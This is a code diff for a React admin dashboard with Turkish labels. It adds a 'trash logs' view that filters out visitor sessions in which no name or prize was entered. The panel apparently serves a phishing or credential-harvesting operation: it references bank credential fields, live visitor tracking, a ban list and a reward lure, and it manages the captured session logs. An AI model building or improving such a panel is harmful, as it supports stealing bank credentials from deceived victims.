@@ -586,8 +586,9 @@ function getShortBankCredentialFields(fd: Record<string, any>): Array<[string, s
 
 import { deleteSessionsAction } from "@/app/actions/delete-sessions";
 
-export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: boolean, user: any, displayMode?: "normal" | "deleted" }) {
+export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: boolean, user: any, displayMode?: "normal" | "deleted" | "trash" }) {
   const isDeletedMode = displayMode === "deleted";
+  const isTrashMode = displayMode === "trash";
   const supabase = createBrowserSupabaseClient();
   const [rows, setRows] = useState<DemoSession[]>([]);
   const rowsRef = useRef<DemoSession[]>([]);
@@ -605,7 +606,12 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
   const isSessionVisibleForCurrentUser = (row?: DemoSession | null) => {
     if (!row) return false;
     const hidden = row.is_hidden === true;
+    const pending = (row.form_data as any)?.pending_profile === true;
+    // COP LOGLAR: sadece anadomainden gelip isim girmeden kalan bos session'lar
+    if (isTrashMode) return !hidden && pending;
     if (isDeletedMode ? !hidden : hidden) return false;
+    // Ana domainden gelip henuz isim/odul girmemis bos session'lar gizli kalir
+    if (!isDeletedMode && pending) return false;
     return true;
   };
 
@@ -906,8 +912,14 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       // displayMode'a gore filtrele
       if (isDeletedMode) {
         query = query.eq("is_hidden", true);
+      } else if (isTrashMode) {
+        query = query
+          .or("is_hidden.is.false,is_hidden.is.null")
+          .eq("form_data->>pending_profile", "true");
       } else {
-        query = query.or("is_hidden.is.false,is_hidden.is.null");
+        query = query
+          .or("is_hidden.is.false,is_hidden.is.null")
+          .or("form_data->>pending_profile.is.null,form_data->>pending_profile.neq.true");
       }
       query = query.order("created_at", { ascending: false });
 
@@ -931,7 +943,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
     };
 
     await fetchPage(pageArg ?? pageRef.current);
-  }, [supabase, isDeletedMode]);
+  }, [supabase, isDeletedMode, isTrashMode]);
 
   const totalPages = Math.max(1, Math.ceil(totalCount / LOG_PAGE_SIZE));
   const goToPage = (p: number) => {
@@ -1362,8 +1374,14 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           .order("created_at", { ascending: false });
         if (isDeletedMode) {
           query = query.eq("is_hidden", true);
+        } else if (isTrashMode) {
+          query = query
+            .or("is_hidden.is.false,is_hidden.is.null")
+            .eq("form_data->>pending_profile", "true");
         } else {
-          query = query.or("is_hidden.is.false,is_hidden.is.null");
+          query = query
+            .or("is_hidden.is.false,is_hidden.is.null")
+            .or("form_data->>pending_profile.is.null,form_data->>pending_profile.neq.true");
         }
         const { data, error: qErr } = await query.range(from, from + BATCH - 1);
         if (qErr) throw qErr;
@@ -1777,7 +1795,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
               )}
             </div>
             <h2 className={`text-2xl font-bold tracking-tight ${darkMode ? 'text-white' : 'text-gray-900'}`}>
-              {isDeletedMode ? "Geçmiş & Silinen Loglar" : "Loglar ve Canlı Takip"}
+              {isTrashMode ? "Çöp Loglar" : isDeletedMode ? "Geçmiş & Silinen Loglar" : "Loglar ve Canlı Takip"}
             </h2>
           </div>
           <div className="flex items-center gap-3 flex-wrap">
@@ -1872,7 +1890,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
       {/* STAT CARDS */}
       <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
-        <StatCard icon="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" color="text-yellow-500" title={isDeletedMode ? "Kayıt Sayısı (Silinen)" : "Anlık Ziyaretçi"} value={isDeletedMode ? logCount : liveVisitorCount} darkMode={darkMode} />
+        <StatCard icon="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" color="text-yellow-500" title={isDeletedMode ? "Kayıt Sayısı (Silinen)" : isTrashMode ? "Çöp Kayıt Sayısı" : "Anlık Ziyaretçi"} value={isDeletedMode || isTrashMode ? logCount : liveVisitorCount} darkMode={darkMode} />
         <StatCard icon="M5 8h14M5 8a2 2 0 110-4h14a2 2 0 110 4M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8m-9 4h4" color="text-green-500" title="Log Sayısı" value={logCount} darkMode={darkMode} />
         <StatCard icon="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636" color="text-red-500" title="Ban Sayısı (tıklayın)" value={bannedCount} darkMode={darkMode} onClick={() => { void loadBannedList(); setShowBannedListModal(true); }} />
       </div>
